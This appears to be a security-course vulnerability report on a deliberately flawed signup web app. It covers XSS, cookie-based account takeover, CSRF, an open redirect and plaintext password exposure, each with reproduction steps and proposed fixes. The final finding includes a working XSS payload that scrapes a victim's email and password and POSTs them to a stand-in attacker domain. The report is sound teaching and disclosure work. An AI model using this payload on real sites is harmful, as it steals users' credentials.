Introduction: this project is for the course [Cyber Security Base](https://cybersecuritybase.github.io/)

---
Type of vulnerability: Cross-site Scripting (XSS)

Description: Allow unescaped javascript in name-field

Steps to reproduce:
- Sign up using the form
- In the 'name' field put an XSS-payload (for example "<svg/onload=alert(1)" without quotes)
- In the other fields put any random text
- Click on the top link "Attendees list".
- The XSS will execute, resulting in a popupbox displaying "1"

Proposed fix 1:
- In /src/main/resources/templates/users.html line 11, change th:utext to th:text
- th:utext outputs unsanitized strings, whereas th:text sanitizes HTML output
- Downside of this fix is that it can cause issues with unicode-characters that do belong in a name

Proposed fix 2:
Validate and encode input from all fields before saving. This will allow all characters to be input as name, but not execute XSS payloads

---

Type of vulnerability: Missing Function Level Access Control

Description: An attacker is able to take over other users' account by abusing cookie values

Steps to reproduce:
- Create an account with random inputs
- Note that once you submit, you get redirected to url /user/{userid}
- Also note that the application wrote a cookie called "cookieuid" with the value of your userid
- Log out
- Note that the cookie is removed
- Create another account with random inputs
- Change the value of cookie "cookieuid" to the userid of your *first* created account
- Click on "My account" in the top navigation bar
- You are redirected to the account page of the first user, because the app identified your userid from your cookie
- You can now edit the information of this user, even though you are not logged in as this user

Proposed fix part 1:
Cookies are files on the user's computer, and can be modified by the user. This makes it an unreliable way to identify a user. Instead, the userid could be linked to the current user session (the JSESSION cookie), which leaves the control of the session with the server instead of the user.

Proposed fix part 2:
This bug works because the app checks only the userid when executing actions. It never checks if the current user has the same userid as the action that it's trying to execute. If the application checks who the current logged-in user is, and if the current request applies to the same userid, it can prevent execution by unauthorized users.
The best solution is to use both parts of this proposed fix: don't rely on the cookie as sole point of identification, and prevent logged-in users from executing actions on different userids.

---

Type of vulnerability: Cross-Site Request Forgery

Description: User can update another user's info page with csrf

Steps to reproduce:
- Create 2 accounts, and stay logged in to the second account
- Go to Account Details page
- Open your browser's devtools and select the <form> element
- Change form-attribute "action" to "/user/{userid of first account}"
- Change some of the data
- Click "Submit"
- You are now redirected to another user's page where your information is now (also) saved

Proposed fix 1:
The application has CSRF-tokens, but these are never validated. This means the main CSRF-defense is basically non-functioning. Fixing the CSRF-token implementation will disallow users from updating someone else's account information

Proposed fix 2:
As with the cookie issue before, the problem here lies in the fact that the application only checks the userid in the request. In this request, the userid in the URL is used to execute the user action. But it never checks if the user is logged in with the same userid as the userid that it's trying to update.

---

Type of vulnerability: Unvalidated redirects & forwards

Description: Attackers can trick users with a modified URL for the login page. This allows the attacker to control where the user goes after logging in.

Steps to reproduce:
- Create an account with random data (but remember the email & password for later)
- Once you've submitted, you are redirected to the url /user/{your user id}
- If you now click on Logout (in the top bar), you are redirected to the login page
- Note that the URL now contains a parameter called "nextpage". This is currently set to the page where you last were before clicking Logout (so nextpage=/user/{userid})
- Change the url so it reads /login?nextpage=https://google.com and hit enter (so the page loads)
- Alternatively, find the hidden input element in the Login form with the name "nextpage". Change the value of this input to "https://google.com"
- Log in with the previously entered email & password
- When submitting, you are redirected to https://google.com

Proposed fix 1:
- In the SignupController (/src/main/java/sec/project/controller/SignupController.java) lines 137-146 describes the logout functionality. This function shows that the referer (which determines the nextpage-redirect) is never validated. It can contain anything, as long as it is a valid URI. 
- You should validate that any referer-URI either matches the current domainname (starts with {currentprotocol}://{currentdomain}:{currentport}) OR that it doesn't contain a domainname (starts with /user, /form, etc)
- If this validation fails, redirect to a fixed page
- If this validation doesn't fail, redirect to the nextpage

---

Type of vulnerability: Sensitive Data Exposure

Description: Account page outputs the user's password in plaintext. That means the password can be stolen by malicious attackers

Steps to reproduce:
- Create an account with random data except the name field (we will use XSS from issue #1 to exploit this issue)
- In the name field, add the following payload: ```fetch(document.getElementById('navheader').children[1].href).then(r => r.text()).then(t => fetch('https://myevildomain.com/', {method:'post',body:JSON.stringify({email: t.match(/email"\svalue="(.*)"/)[1],password: t.match(/password"\svalue="(.*)"/)[1]})}));```
- This payload does 2 things: it first performs a GET-request to your account-page, and then it performs a POST-request to an attacker's server with the extracted email & password from the returned HTML
- Every user that visits the Attendees List will run this script (as explained in the XSS vulnerability) that posts their credentials to an external server

Proposed fix:
- Passwords should never be returned in plaintext. This indicates that they are not properly stored on the server as well.
- Instead of returning the user's password on their account page, allow a field to change their password but do not prefill it with their current one
- On server-side store passwords with a one-way hash. When the user logs in, hash their provided password and compare against the stored password
- This requires a fix in the SignupController on line 159, and in the Signup entity where the password is checked against the database
